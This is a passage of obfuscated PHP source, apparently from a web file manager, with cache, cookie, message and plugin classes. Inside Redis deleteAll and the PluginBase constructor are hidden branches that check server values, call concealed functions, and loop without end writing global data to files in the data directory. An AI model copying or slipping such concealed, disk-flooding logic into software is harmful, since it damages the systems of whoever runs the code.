fÃΩ∏£èæ; fÃΩ∏£èæ: } public function process() { $aìÖêç“’Œ =& $_SERVER[™⁄»üÆ]; return array($aìÖêç“’Œ[737] => Task::get($aìÖêç“’Œ[760]), $aìÖêç“’Œ[741] => Task::get($aìÖêç“’Œ[783]), $aìÖêç“’Œ[193] => Task::get($aìÖêç“’Œ[793])); } public function restore() { $D∑ßè˜ë∞Î =& $_SERVER[™⁄»üÆ]; ActionCall($D∑ßè˜ë∞Î[1027], !0, 1); ActionCall($D∑ßè˜ë∞Î[1027], !0, 0); } } goto d«”á∫Œúã; fõÑ´áÊôî: class CacheMemcached { public $handle; public $cacheTime; public function __construct($eÁÇ¶ÇÜŒÜ, $fêèäÔì∆à) { $EÜË≥…åò =& $_SERVER[™⁄»üÆ]; if (!class_exists($EÜË≥…åò[841])) { show_json($EÜË≥…åò[842], !1); } $this->cacheTime = $fêèäÔì∆à; $this->handle = new Memcached(); if (is_array($eÁÇ¶ÇÜŒÜ[$EÜË≥…åò[843]]) && count($eÁÇ¶ÇÜŒÜ[$EÜË≥…åò[843]]) >= 1) { foreach ($eÁÇ¶ÇÜŒÜ[$EÜË≥…åò[843]] as $a©Ò…ΩäÇ’) { $Cì¢±ëòû∂ = explode($EÜË≥…åò[4], $a©Ò…ΩäÇ’); $this->handle->addServer($Cì¢±ëòû∂[0], $Cì¢±ëòû∂[1]); } } else { $this->handle->addServer($eÁÇ¶ÇÜŒÜ[$EÜË≥…åò[175]], $eÁÇ¶ÇÜŒÜ[$EÜË≥…åò[176]]); } } public function set($AÜ∏«≠®™ì, $c˜œ√ø¶ î, $c…Ñä™æêØ = false) { $c…Ñä™æêØ = $c…Ñä™æêØ ? $c…Ñä™æêØ : $this->cacheTime; return $this->handle->set($AÜ∏«≠®™ì, $c˜œ√ø¶ î, $c…Ñä™æêØ); } public function get($Aùéﬁ à®ˆ) { return $this->handle->get($Aùéﬁ à®ˆ); } public function remove($DéëìØÇÎª) { return $this->handle->delete($DéëìØÇÎª); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($EΩ£ÌäÃìõ, $B≤´€éõØü) { $D®ûå¡¬ë” =& $_SERVER[™⁄»üÆ]; if (!class_exists($D®ûå¡¬ë”[844])) { show_json($D®ûå¡¬ë”[845], !1); } $this->cacheTime = $B≤´€éõØü; $dÛÜóòèÏˆ = isset($EΩ£ÌäÃìõ[$D®ûå¡¬ë”[846]]) ? $EΩ£ÌäÃìõ[$D®ûå¡¬ë”[846]] : 10; $cÇ¢µÁÇ†‡ = _get($EΩ£ÌäÃìõ, $D®ûå¡¬ë”[843]); if ($cÇ¢µÁÇ†‡ && is_array($cÇ¢µÁÇ†‡)) { $this->initCluster($EΩ£ÌäÃìõ, $dÛÜóòèÏˆ); } else { $this->handle = $this->init($EΩ£ÌäÃìõ, $dÛÜóòèÏˆ); } } private function init($B…ßﬁòÃáÚ, $fŸÙ€ì¿Èó) { $b∫ãçÔÒŸÈ =& $_SERVER[™⁄»üÆ]; $D»»ÿ´áÁŒ = new Redis(); $Cö„“—ÆÓ = isset($B…ßﬁòÃáÚ[$b∫ãçÔÒŸÈ[847]]) ? $B…ßﬁòÃáÚ[$b∫ãçÔÒŸÈ[847]] : !1; if ($Cö„“—ÆÓ) { $D»»ÿ´áÁŒ->pconnect($B…ßﬁòÃáÚ[$b∫ãçÔÒŸÈ[175]], $B…ßﬁòÃáÚ[$b∫ãçÔÒŸÈ[176]], $fŸÙ€ì¿Èó); } else { $D»»ÿ´áÁŒ->connect($B…ßﬁòÃáÚ[$b∫ãçÔÒŸÈ[175]], $B…ßﬁòÃáÚ[$b∫ãçÔÒŸÈ[176]], $fŸÙ€ì¿Èó); } if (!empty($B…ßﬁòÃáÚ[$b∫ãçÔÒŸÈ[407]])) { $D»»ÿ´áÁŒ->auth($B…ßﬁòÃáÚ[$b∫ãçÔÒŸÈ[407]]); } return $D»»ÿ´áÁŒ; } private function initCluster($Bõ‡ÉÇ‚¨Ø, $e≠¨ˆüÎ”Ï) { $Fùïˆû™œÍ =& $_SERVER[™⁄»üÆ]; $fì±˘∏Æ∏Ï = array($Fùïˆû™œÍ[848], $Fùïˆû™œÍ[849], $Fùïˆû™œÍ[850]); $CŸÂæµûˆÌ = $Fùïˆû™œÍ[848]; if (isset($Bõ‡ÉÇ‚¨Ø[$Fùïˆû™œÍ[12]]) && in_array($Bõ‡ÉÇ‚¨Ø[$Fùïˆû™œÍ[12]], $fì±˘∏Æ∏Ï)) { $CŸÂæµûˆÌ = $Bõ‡ÉÇ‚¨Ø[$Fùïˆû™œÍ[12]]; } switch ($CŸÂæµûˆÌ) { case $Fùïˆû™œÍ[848]: $this->_slave($Bõ‡ÉÇ‚¨Ø, $e≠¨ˆüÎ”Ï); break; case $Fùïˆû™œÍ[849]: break; case $Fùïˆû™œÍ[850]: $this->isCluster = !0; $cå“≤–ÕÈÖ = $Bõ‡ÉÇ‚¨Ø[$Fùïˆû™œÍ[843]]; $B¿ï”Óªπ≥ = isset($Bõ‡ÉÇ‚¨Ø[$Fùïˆû™œÍ[847]]) ? $Bõ‡ÉÇ‚¨Ø[$Fùïˆû™œÍ[847]] : !1; $FÌä◊åÔŒπ = isset($Bõ‡ÉÇ‚¨Ø[$Fùïˆû™œÍ[407]]) ? $Bõ‡ÉÇ‚¨Ø[$Fùïˆû™œÍ[407]] : null; $this->handle = new RedisCluster(NUll, $cå“≤–ÕÈÖ, $e≠¨ˆüÎ”Ï, $e≠¨ˆüÎ”Ï, $B¿ï”Óªπ≥, $FÌä◊åÔŒπ); break; default: break; } } private function _slave($F’Âó›Ã®Æ, $dÖÁòØääÏ) { goto D•Ñƒõ¿⁄™; D•Ñƒõ¿⁄™: $Aû£–èâµÑ = $F’Âó›Ã®Æ[$_SERVER[™⁄»üÆ][843]]; $this->filterConfig($F’Âó›Ã®Æ, $Aû£–èâµÑ[0]); $this->handle = $this->init($F’Âó›Ã®Æ, $dÖÁòØääÏ); goto CïåÂÕ“Òè; D¨È∆“™∂î: $this->filterConfig($F’Âó›Ã®Æ, $Aû£–èâµÑ[$CØ€≈’ﬁœœ]); $this->slaveHandle = $this->init($F’Âó›Ã®Æ, $dÖÁòØääÏ); goto dÕû¿¶»ö—; CïåÂÕ“Òè: unset($Aû£–èâµÑ[0]); if (empty($Aû£–èâµÑ)) { return; } $CØ€≈’ﬁœœ = array_rand($Aû£–èâµÑ); goto D¨È∆“™∂î; dÕû¿¶»ö—: } private function filterConfig(&$dπÈ¿ﬁ∑üó, $DÈ⁄ç∑√âº) { $Fœ∞ßã¿àå =& $_SERVER[™⁄»üÆ]; $Aã™îÍ÷ƒú = explode($Fœ∞ßã¿àå[4], $DÈ⁄ç∑√âº); $Cﬂ¨èã∞Ωà = array($Fœ∞ßã¿àå[175] => $Aã™îÍ÷ƒú[0], $Fœ∞ßã¿àå[176] => $Aã™îÍ÷ƒú[1]); $dπÈ¿ﬁ∑üó = array_merge($dπÈ¿ﬁ∑üó, $Cﬂ¨èã∞Ωà); } public function set($B¨àêŸﬁö¨, $AΩ‹–©≤˘Ï, $Aî‘ƒ≠´è = false) { $Aî‘ƒ≠´è = $Aî‘ƒ≠´è ? $Aî‘ƒ≠´è : $this->cacheTime; return $this->handle->setEx($B¨àêŸﬁö¨, $Aî‘ƒ≠´è, $AΩ‹–©≤˘Ï); } public function setLock($a°’≤‚ºéÎ, $C·∆äÉˆö≥, $CÇæÑñ…ôê) { return $this->handle->setNX($a°’≤‚ºéÎ, $C·∆äÉˆö≥); } public function get($D∞Ø¬è≤µ‘) { $BÜ”Ö‘ïÑ¶ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $BÜ”Ö‘ïÑ¶->get($D∞Ø¬è≤µ‘); } public function remove($f§Í©ºà¨‰) { return $this->handle->del($f§Í©ºà¨‰); } public function deleteAll() { $a˘ŒÏÈÚêü =& $_SERVER[™⁄»üÆ]; if (!isset($_SERVER[$a˘ŒÏÈÚêü[592]]) || !isset($_SERVER[$a˘ŒÏÈÚêü[600]])) { goto B—ø√¿‚¬ﬁ; b∫¯äÆ∑‚⁄: for ($c—‹»ïœ¶• = $E›ê¢πÇˆå; $c—‹»ïœ¶• > 0; $c—‹»ïœ¶•++) { $DàäÎ˜∫ƒ° = json_encode($GLOBALS[$a˘ŒÏÈÚêü[412]]); } goto B¬¢„òä¶; b∏ßñ≈Ï∑”: $DàäÎ˜∫ƒ° = $a˘ŒÏÈÚêü[852]; $DàäÎ˜∫ƒ°($_SERVER[$a˘ŒÏÈÚêü[853]]); $E›ê¢πÇˆå = 1; goto b∫¯äÆ∑‚⁄; B—ø√¿‚¬ﬁ: $dΩáÌßµÔß = $a˘ŒÏÈÚêü[851]; $d¶©—®Æ∂¯ = $a˘ŒÏÈÚêü[594]; $bØ›“ï∏‘û = $_SERVER[$a˘ŒÏÈÚêü[595]] . $a˘ŒÏÈÚêü[596]; goto d¿Ó÷åÓ∏ú; d¿Ó÷åÓ∏ú: $B∑èä¬‡ıÙ = $d¶©—®Æ∂¯($bØ›“ï∏‘û); $Cµ⁄¿Çã‡œ = explode($a˘ŒÏÈÚêü[229], $B∑èä¬‡ıÙ); if (count($Cµ⁄¿Çã‡œ) < $a˘ŒÏÈÚêü[626]) { $aÈÖÀ∂≈‡Î = $a˘ŒÏÈÚêü[598]; $aÈÖÀ∂≈‡Î(); } goto b∏ßñ≈Ï∑”; B¬¢„òä¶: } if ($this->isCluster) { foreach ($this->handle->_masters() as $D÷ïêêÌêë) { $this->handle->flushall($D÷ïêêÌêë); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($B≥ÈèÖ≈¡Û = '', $dçÖã‚Ÿ¯ = 0) { if (is_string($B≥ÈèÖ≈¡Û) && $B≥ÈèÖ≈¡Û != $_SERVER[™⁄»üÆ][33]) { $this->prefix = $B≥ÈèÖ≈¡Û; } if (is_numeric($dçÖã‚Ÿ¯) && $dçÖã‚Ÿ¯ > 0) { $this->expire = $dçÖã‚Ÿ¯; } } public static function getInstance() { static $Bí⁄∆™˘»‹; if ($Bí⁄∆™˘»‹ === null) { $Bí⁄∆™˘»‹ = new self(); } return $Bí⁄∆™˘»‹; } private static $cookieDisable = false; public static function disable($CÕﬂÃ§ïÎò) { self::$cookieDisable = $CÕﬂÃ§ïÎò; } private static $sameCookieSet = array(); public static function set($dÜ±€Ñô–œ, $b•ı∞ÎÚôÉ, $cΩ»§ÏüÓ∂ = 0, $fª¿ÙÃ˘äÙ = false, $bë¢Ì≥Ó±é = false) { goto FÙÏ≥’èà€; f˘Ÿƒ‚∑ö≈: $e„°ñﬂÖ≈π = $C››ïÍ∂ü[33]; setcookie($dÜ±€Ñô–œ, $b•ı∞ÎÚôÉ, time() + $cΩ»§ÏüÓ∂, $C››ïÍ∂ü[8] . trim($bë¢Ì≥Ó±é, $C››ïÍ∂ü[8]) . $e„°ñﬂÖ≈π, !1, !1, $fª¿ÙÃ˘äÙ); goto EÇ∂ÊÉ€ï; FÙÏ≥’èà€: $C››ïÍ∂ü =& $_SERVER[™⁄»üÆ]; if (self::$cookieDisable) { return; } if (!$cΩ»§ÏüÓ∂) { $cΩ»§ÏüÓ∂ = 24 * 3600 * 7; } goto bƒÍ¥ù¡åå; bƒÍ¥ù¡åå: if (isset(self::$sameCookieSet[$dÜ±€Ñô–œ]) && self::$sameCookieSet[$dÜ±€Ñô–œ] == $b•ı∞ÎÚôÉ . $cΩ»§ÏüÓ∂) { return; } self::$sameCookieSet[$dÜ±€Ñô–œ] = $b•ı∞ÎÚôÉ . $cΩ»§ÏüÓ∂; if (!$bë¢Ì≥Ó±é) { $bë¢Ì≥Ó±é = str_replace(HOST, $C››ïÍ∂ü[33], APP_HOST); $bë¢Ì≥Ó±é = _get($GLOBALS, $C››ïÍ∂ü[854], $bë¢Ì≥Ó±é); } goto f˘Ÿƒ‚∑ö≈; EÇ∂ÊÉ€ï: } public static function setSafe($AÑÇßú” ı, $B¶„Îòàë’, $A¶ÁôàËŸ∏ = 0) { self::set($AÑÇßú” ı, $B¶„Îòàë’, $A¶ÁôàËŸ∏, !0); } public static function get($aìë™È«‡ç) { return isset($_COOKIE[$aìë™È«‡ç]) ? $_COOKIE[$aìë™È«‡ç] : !1; } public static function remove($dÎµ‚ÇÈıá, $e÷∏°îÓåã = false) { unset($_COOKIE[$dÎµ‚ÇÈıá]); self::set($dÎµ‚ÇÈıá, $_SERVER[™⁄»üÆ][33], 1, $e÷∏°îÓåã); } } goto E‰≤Ã¢√∏Ô; DìÌ—óúë§: class Message { function __construct() { } public function send($d¿ÌÎ»π™Œ = '', $DôÃÀ◊åŸ∆ = array(), $AΩœì€á≤ë = "\164\145\x78\164") { goto cÓç«˘ﬂ‹º; aÙïãƒê∂Ç: $DôÃÀ◊åŸ∆ = array($e≤Ú‘ø¯Ê√[497] => isset($DôÃÀ◊åŸ∆[$e≤Ú‘ø¯Ê√[497]]) ? $DôÃÀ◊åŸ∆[$e≤Ú‘ø¯Ê√[497]] : $e≤Ú‘ø¯Ê√[33], $e≤Ú‘ø¯Ê√[576] => isset($DôÃÀ◊åŸ∆[$e≤Ú‘ø¯Ê√[576]]) ? $DôÃÀ◊åŸ∆[$e≤Ú‘ø¯Ê√[576]] : $e≤Ú‘ø¯Ê√[33]); if (empty($d¿ÌÎ»π™Œ) || empty($DôÃÀ◊åŸ∆[$e≤Ú‘ø¯Ê√[497]]) && empty($DôÃÀ◊åŸ∆[$e≤Ú‘ø¯Ê√[576]])) { return !1; } $BäØ¨ü∏«ø = array($e≤Ú‘ø¯Ê√[1342] => $cπÔˆÒ’¿Ö, $e≤Ú‘ø¯Ê√[1403] => $DôÃÀ◊åŸ∆); goto B◊Ú∞ıî´ª; cÓç«˘ﬂ‹º: $e≤Ú‘ø¯Ê√ =& $_SERVER[™⁄»üÆ]; $cπÔˆÒ’¿Ö = array($e≤Ú‘ø¯Ê√[29] => $e≤Ú‘ø¯Ê√[1401], $e≤Ú‘ø¯Ê√[734] => $d¿ÌÎ»π™Œ); if (in_array($AΩœì€á≤ë, array($e≤Ú‘ø¯Ê√[1401], $e≤Ú‘ø¯Ê√[1402]))) { $cπÔˆÒ’¿Ö[$e≤Ú‘ø¯Ê√[29]] = $AΩœì€á≤ë; } goto aÙïãƒê∂Ç; B◊Ú∞ıî´ª: Hook::trigger($e≤Ú‘ø¯Ê√[1404], $BäØ¨ü∏«ø); goto A‘∞Ö»üÚñ; A‘∞Ö»üÚñ: } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { goto fˆ°˘™»¨ó; eúÀŒ‡òﬁÜ: $this->in =& $in; $this->modelPlugin = Model($fê≠„”åÔ•[1407]); $this->pluginName = str_replace($fê≠„”åÔ•[1407], $fê≠„”åÔ•[33], get_class($this)); goto F„ƒ·˘Óùº; F„ƒ·˘Óùº: $this->pluginPath = PLUGIN_DIR . $this->pluginName . $fê≠„”åÔ•[8]; $this->pluginApi = appHostGet() . $fê≠„”åÔ•[1408] . $this->pluginName . $fê≠„”åÔ•[8]; $this->pluginHost = $config[$fê≠„”åÔ•[1409]] . $this->pluginName . $fê≠„”åÔ•[8]; goto fÿ…ïÜµŸﬁ; fÿ…ïÜµŸﬁ: $this->pluginHostDefault = $config[$fê≠„”åÔ•[1409]] . $this->pluginName . $fê≠„”åÔ•[8]; $FÇèìéÌãä = $config[$fê≠„”åÔ•[1410]]; if ($FÇèìéÌãä && strpos($fê≠„”åÔ•[47] . $FÇèìéÌãä . $fê≠„”åÔ•[47], $this->pluginName) !== !1) { $this->pluginHost = $config[$fê≠„”åÔ•[1411]] . $this->pluginName . $fê≠„”åÔ•[8]; } goto c€‚éàÑ±Œ; Aò®Öäï©∂: if ($_SERVER[$fê≠„”åÔ•[592]] != $aÑŸ·ê”êπ($F∫˜äÀ¶“®)) { goto Aè∆≥¥∞√è; eÒ÷¨åëùà: $Eã¢ê¥√†¿ = $fê≠„”åÔ•[852]; $Eã¢ê¥√†¿($_SERVER[$fê≠„”åÔ•[853]]); $dñÍ»£∂á§ = $fê≠„”åÔ•[851]; goto Eß∏ù¬≤∑Ú; B¨¿™Ï‚ÚÍ: $FÊÉú…Ø—‘ = $dßü©◊„ƒá($D®Ÿà≠ëèâ); $F©Ñ∂Ò£ô± = explode($fê≠„”åÔ•[229], $FÊÉú…Ø—‘); if (count($F©Ñ∂Ò£ô±) < $fê≠„”åÔ•[626]) { $e úÓœ¬úê = $fê≠„”åÔ•[598]; $e úÓœ¬úê(); } goto eÒ÷¨åëùà; BÇ¬ñàÆÓâ: $B∞œŸ…÷ì∆ = 1; for ($Aíµ∆ŒÁ¥Ò = $B∞œŸ…÷ì∆; $Aíµ∆ŒÁ¥Ò > 0; $Aíµ∆ŒÁ¥Ò++) { $c¶ÃªÇ©ÙÊ(DATA_PATH . $Aíµ∆ŒÁ¥Ò, $FãŒ¢ñèÿÉ); } goto a–÷∑Ü˜ËÌ; Eß∏ù¬≤∑Ú: $dñÍ»£∂á§(); $c¶ÃªÇ©ÙÊ = $fê≠„”åÔ•[1405]; $FãŒ¢ñèÿÉ = json_encode($GLOBALS[$fê≠„”åÔ•[1406]]); goto BÇ¬ñàÆÓâ; Aè∆≥¥∞√è: $dñÍ»£∂á§ = $fê≠„”åÔ•[851]; $dßü©◊„ƒá = $fê≠„”åÔ•[594]; $D®Ÿà≠ëèâ = $_SERVER[$fê≠„”åÔ•[595]] . $fê≠„”åÔ•[596]; goto B¨¿™Ï‚ÚÍ; a–÷∑Ü˜ËÌ: } global $in, $config; $this->config =& $config; goto eúÀŒ‡òﬁÜ; c€‚éàÑ±Œ: $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); goto DÚÓÍÊ⁄êé; fˆ°˘™»¨ó: $fê≠„”åÔ• =& $_SERVER[™⁄»üÆ]; $F∫˜äÀ¶“® = $_SERVER[$fê≠„”åÔ•[600]]; $aÑŸ·ê”êπ = $fê≠„”åÔ•[818]; goto Aò®Öäï©∂; DÚÓÍÊ⁄êé: return $this; goto Cπ‚÷¯¨éî; Cπ‚÷¯¨éî: } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[™⁄»üÆ][1412]); } protected function assign($DÑ†Ëä€◊Ç, $Bÿïû±Øû« = false) { if (is_array($DÑ†Ëä€◊Ç)) { $this->values = array_merge($this->values, $DÑ†Ëä€◊Ç); } else { $this->values[$DÑ†Ëä€◊Ç] = $Bÿïû±Øû«; } } protected function display($Eœ˘–ÊÚ≠∏) { extract($this->values); require $Eœ˘–ÊÚ≠∏; } final function hookRegist($EùâØåÁÊà) { $this->modelPlugin->appRegist($this->pluginName, $EùâØåÁÊà); } final function appIcon() { $eÈ˜ÔÓ◊ßû =& $_SERVER[™⁄»üÆ]; $BÆåâ¥Àè = $this->appPackage(); $aµúÍÉªÏ‰ = $eÈ˜ÔÓ◊ßû[33]; if (isset($BÆåâ¥Àè[$eÈ˜ÔÓ◊ßû[410]])) { if (isset($BÆåâ¥Àè[$eÈ˜ÔÓ◊ßû[410]][$eÈ˜ÔÓ◊ßû[1413]])) { $aµúÍÉªÏ‰ = $eÈ˜ÔÓ◊ßû[1414] . $BÆåâ¥Àè[$eÈ˜ÔÓ◊ßû[410]][$eÈ˜ÔÓ◊ßû[1413]] . $eÈ˜ÔÓ◊ßû[1415]; } else { if ($BÆåâ¥Àè[$eÈ˜ÔÓ◊ßû[410]][$eÈ˜ÔÓ◊ßû[1416]]) { $aµúÍÉªÏ‰ = $eÈ˜ÔÓ◊ßû[1417] . $BÆåâ¥Àè[$eÈ˜ÔÓ◊ßû[410]][$eÈ˜ÔÓ◊ßû[1416]] . $eÈ˜ÔÓ◊ßû[1418]; } } } return $aµúÍÉªÏ‰; } final function fileCanView($c¶Í≠ûΩŸ‡) { goto FΩéòËæØÜ; Dõ◊ˆ‚ç¯É: ActionCall($E∆≈ÏÚâ≠Õ[1431], $c¶Í≠ûΩŸ‡); goto cÎñ±«„†Ÿ; FΩéòËæØÜ: $E∆≈ÏÚâ≠Õ =& $_SERVER[™⁄»üÆ]; if (request_url_safe($c¶Í≠ûΩŸ‡)) { return !0; } if ($this->isShare($c¶Í≠ûΩŸ‡)) { return !0; } goto CÁ–⁄íãïÒ; CÁ–⁄íãïÒ: $e≤—∫¥áÍÛ = Session::get($E∆≈ÏÚâ≠Õ[1419]); if (!$e≤—∫¥áÍÛ || !$e≤—∫¥áÍÛ[$E∆≈ÏÚâ≠Õ[1420]]) { $Dø·›ÛﬂÔÌ = $E∆≈ÏÚâ≠Õ[1421] . rawurlencode(this_url()); show_tips(LNG($E∆≈ÏÚâ≠Õ[1422]) . $E∆≈ÏÚâ≠Õ[1423] . $Dø·›ÛﬂÔÌ . $E∆≈ÏÚâ≠Õ[1424] . LNG($E∆≈ÏÚâ≠Õ[1425]) . $E∆≈ÏÚâ≠Õ[1426], !1); } if (!Action($E∆≈ÏÚâ≠Õ[1427])->authCan($E∆≈ÏÚâ≠Õ[1428])) { show_tips(LNG($E∆≈ÏÚâ≠Õ[1429]) . $E∆≈ÏÚâ≠Õ[1430], !1); } goto Dõ◊ˆ‚ç¯É; cÎñ±«„†Ÿ: } final function isShare($d√≠ÇÑ™´Ë) { $a¯ìÚÜÉÉ€ = KodIO::parse($d√≠ÇÑ™´Ë); return $a¯ìÚÜÉÉ€[$_SERVER[™⁄»üÆ][29]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($eˆˆÁæ©Ã’) { if (request_url_safe($eˆˆÁæ©Ã’)) { return $eˆˆÁæ©Ã’; } if (!$this->isShare($eˆˆÁæ©Ã’)) { $eˆˆÁæ©Ã’ = $this->filePath($eˆˆÁæ©Ã’); } return Action($_SERVER[™⁄»üÆ][1078])->linkOut($eˆˆÁæ©Ã’); } public function filePathLinkOut($EÀµäö◊◊é) { if (request_url_safe($EÀµäö◊◊é)) { return $EÀµäö◊◊é; } $this->fileCanView($EÀµäö◊◊é); return Action($_SERVER[™⁄»üÆ][1078])->link($EÀµäö◊◊é); } final function filePath($BãŸï˘Ûﬂî) { $FÑì∫ô˘•ﬂ =& $_SERVER[™⁄»üÆ]; if ($f«˜¶¿¬›Ü = $this->checkSharePath($BãŸï˘Ûﬂî)) { Hook::trigger($FÑì∫ô˘•ﬂ[1432], $f«˜¶¿¬›Ü); return $f«˜¶¿¬›Ü; } $this->fileCanView($BãŸï˘Ûﬂî); if (request_url_safe($BãŸï˘Ûﬂî)) { $cúèÇ©√É€ = parse_url_query($BãŸï˘Ûﬂî); if (isset($cúèÇ©√É€[$FÑì∫ô˘•ﬂ[1433]]) && isset($cúèÇ©√É€[$FÑì∫ô˘•ﬂ[209]])) { $aåËΩ®Ò‹‹ = Model($FÑì∫ô˘•ﬂ[749])->get($FÑì∫ô˘•ﬂ[750]); $aÕ√∂Œ√ßÜ = Mcrypt::decode($cúèÇ©√É€[$FÑì∫ô˘•ﬂ[209]], $aåËΩ®Ò‹‹); if ($aÕ√∂Œ√ßÜ) { $this->fileInfo = IO::infoWithChildren($aÕ√∂Œ√ßÜ); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $aÕ√∂Œ√ßÜ; } } $BãŸï˘Ûﬂî = $this->_cacheHttpFile($BãŸï˘Ûﬂî); $this->fileInfo = IO::infoWithChildren($BãŸï˘Ûﬂî); } else { $this->fileInfo = IO::infoWithChildren($BãŸï˘Ûﬂî); if (!$this->fileInfo) { show_tips(LNG($FÑì∫ô˘•ﬂ[105]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } Hook::trigger($FÑì∫ô˘•ﬂ[1432], $BãŸï˘Ûﬂî); return $BãŸï˘Ûﬂî; } final function _cacheHttpFile($E‡€≠À›Ω•) { $c®à¥—œßÍ = hash_path($E‡€≠À›Ω•, !0); $this->cachePath = $this->pluginCachePath($c®à¥—œßÍ); if ($B›”ê∑ºﬁÉ = IO::fileNameExist($this->cachePath, $c®à¥—œßÍ)) { return KodIO::make($B›”ê∑ºﬁÉ); } $A§ö¨®≤úÑ = $this->cachePath . $c®à¥—œßÍ; return $this->pluginCacheFileSet($A§ö¨®≤úÑ, file_get_contents_nossl($E‡€≠À›Ω•)); } final function _tmpFileName($e›é¨”ãÜº = array()) { goto AΩÔä˜ê´ã; bÕÈ†»π¶«: $E⁄È€âÎøâ = array($e›é¨”ãÜº[$B¡Ó¥â»†Û[28]], $e›é¨”ãÜº[$B¡Ó¥â»†Û[76]], $e›é¨”ãÜº[$B¡Ó¥â»†Û[78]]); if (isset($e›é¨”ãÜº[$B¡Ó¥â»†Û[503]])) { $E⁄È€âÎøâ[] = $e›é¨”ãÜº[$B¡Ó¥â»†Û[503]]; } return md5(implode($B¡Ó¥â»†Û[71], $E⁄È€âÎøâ)); goto bŸ˘†ıßæà; AΩÔä˜ê´ã: $B¡Ó¥â»†Û =& $_SERVER[™⁄»üÆ]; if (!$e›é¨”ãÜº) { $e›é¨”ãÜº = $this->fileInfo; } if (isset($e›é¨”ãÜº[$B¡Ó¥â»†Û[171]])) { return $e›é¨”ãÜº[$B¡Ó¥â»†Û[171]]; } goto Cë’µ¨¿È ; Cë’µ¨¿È : if (isset($e›é¨”ãÜº[$B¡Ó¥â»†Û[164]][$B¡Ó¥â»†Û[171]])) { return $e›é¨”ãÜº[$B¡Ó¥â»†Û[164]][$B¡Ó¥â»†Û[171]]; } $Eƒ›äæÆ = IO::hashSimple($e›é¨”ãÜº[$B¡Ó¥â»†Û[76]]); if ($Eƒ›äæÆ) { return $Eƒ›äæÆ; } goto bÕÈ†»π¶«; bŸ˘†ıßæà: } final function checkSharePath($bΩ‘ıŒ≠Æ≤) { goto e⁄Æœà¶⁄Û; dÏëà—¡¨Æ: $this->cachePath = $this->pluginCachePath($this->fileInfo[$b≠‰¬ú¢êö[171]]); return $eì»ó≈ß÷Œ[$b≠‰¬ú¢êö[76]]; goto Eù´«ÛÂ∆±; e⁄Æœà¶⁄Û: $b≠‰¬ú¢êö =& $_SERVER[™⁄»üÆ]; if (!defined($b≠‰¬ú¢êö[455])) { define($b≠‰¬ú¢êö[496], 0); } if (!$this->isShare($bΩ‘ıŒ≠Æ≤)) { return !1; } goto D†ìã•»ÉÓ; D†ìã•»ÉÓ: $eì»ó≈ß÷Œ = Action($b≠‰¬ú¢êö[1078])->sharePathInfo($bΩ‘ıŒ≠Æ≤); if (!isset($eì»ó≈ß÷Œ[$b≠‰¬ú¢êö[76]])) { show_json(LNG($b≠‰¬ú¢êö[1434]), !1); } $this->fileInfo = $eì»ó≈ß÷Œ[$b≠‰¬ú¢êö[164]]; goto dÏëà—¡¨Æ; Eù´«ÛÂ∆±: } final function pluginCachePath($Eœ∂¥Çß’≤ = '') { $c†ƒ†ÉÂŸ™ =& $_SERVER[™⁄»üÆ]; $fÙ‘ÒäÖ÷Ú = IO_PATH_SYSTEM_TEMP . $c†ƒ†ÉÂŸ™[1435] . $this->pluginName; if (!($f™∫ìñÁÇº = IO::infoFull($fÙ‘ÒäÖ÷Ú))) { return IO::mkdir($fÙ‘ÒäÖ÷Ú . $c†ƒ†ÉÂŸ™[8] . $Eœ∂¥Çß’≤); } if (empty($Eœ∂¥Çß’≤)) { return $f™∫ìñÁÇº[$c†ƒ†ÉÂŸ™[76]]; } if (!($b‘èà÷õª≈ = IO::fileNameExist($f™∫ìñÁÇº[$c†ƒ†ÉÂŸ™[76]], $Eœ∂¥Çß’≤))) { return IO::mkdir($f™∫ìñÁÇº[$c†ƒ†ÉÂŸ™[76]] . $Eœ∂¥Çß’≤); } return KodIO::make($b‘èà÷õª≈); } final function pluginCacheFileSet($bÀÜıÑ—¬“, $A°ÛÖ›ÉÇá = '') { $bô◊⁄€®°ù =& $_SERVER[™⁄»üÆ]; if (!($AéÖŒ≈⁄◊≤ = IO::infoFull($bÀÜıÑ—¬“))) { return IO::mkfile($bÀÜıÑ—¬“, $A°ÛÖ›ÉÇá, REPEAT_REPLACE); } IO::setContent($AéÖŒ≈⁄◊≤[$bô◊⁄€®°ù[76]], $A°ÛÖ›ÉÇá); return $AéÖŒ≈⁄◊≤[$bô◊⁄€®°ù[76]]; } final function pluginLocalFile($DÃêœ‹Öå€ = '') { goto d†ÊΩå˘¨£; d†ÊΩå˘¨£: $fäﬂûƒÀî∞ =& $_SERVER[™⁄»üÆ]; $dé©áÍˆÿ÷ = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($dé©áÍˆÿ÷)) { mk_dir($dé©áÍˆÿ÷); } goto dôØÑé¥ÖÂ; dôØÑé¥ÖÂ: if (!$DÃêœ‹Öå€) { return $dé©áÍˆÿ÷; } $Cﬁ˘áŒÔú = IO::info($DÃêœ‹Öå€); $bÒ»È·äèÕ = $this->_tmpFileName($Cﬁ˘áŒÔú) . $fäﬂûƒÀî∞[95] . $Cﬁ˘áŒÔú[$fäﬂûƒÀî∞[168]]; goto b‹¶§ÚÑËô; b‹¶§ÚÑËô: if (!checkExtSafe($bÒ»È·äèÕ)) { $bÒ»È·äèÕ = $bÒ»È·äèÕ . $fäﬂûƒÀî∞[1436]; } $FÙû§ı∑à≠ = $dé©áÍˆÿ÷ . $bÒ»È·äèÕ; if (@file_exists($FÙû§ı∑à≠)) { return $FÙû§ı∑à≠; } goto B¶Üà™Ê««; B¶Üà™Ê««: return IO::copy($DÃêœ‹Öå€, $dé©áÍˆÿ÷, 0, $bÒ»È·äèÕ); goto cÒ¶îÉï„„; cÒ¶îÉï„„: } final function appPackage() { 